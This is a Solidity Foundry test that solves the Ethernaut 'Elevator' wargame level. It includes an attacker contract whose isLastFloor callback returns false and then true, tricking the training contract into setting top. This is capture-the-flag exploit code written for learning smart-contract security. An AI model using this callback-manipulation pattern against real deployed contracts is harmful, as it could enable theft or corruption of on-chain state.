// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {ElevatorFactory} from "../src/factories/ElevatorFactory.sol";
import {Elevator} from "../src/levels/Elevator.sol";

import "forge-std/console.sol";

contract ElevatorTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        ElevatorFactory factory = new ElevatorFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveElevator() public {
        Elevator elevator = Elevator(payable(levelAddress));

        // [START]

        console.log("[Before] top:");
        console.logBool(elevator.top());

        // 1. Deploy attacker contract
        ElevatorAttack attacker = new ElevatorAttack(payable(levelAddress));

        uint256 floor = 10; // Whatever floor you want to go to
        attacker.goTo(floor);

        console.log("[After] top:");
        console.logBool(elevator.top());

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attacker contract
contract ElevatorAttack {
    Elevator public target;
    bool public flag;

    constructor(address _target) {
        target = Elevator(_target);
        flag = false;
    }

    function goTo(uint256 _floor) public {
        target.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (flag == false) {
            flag = true;
            return false;
        }
        return true;
    }
}
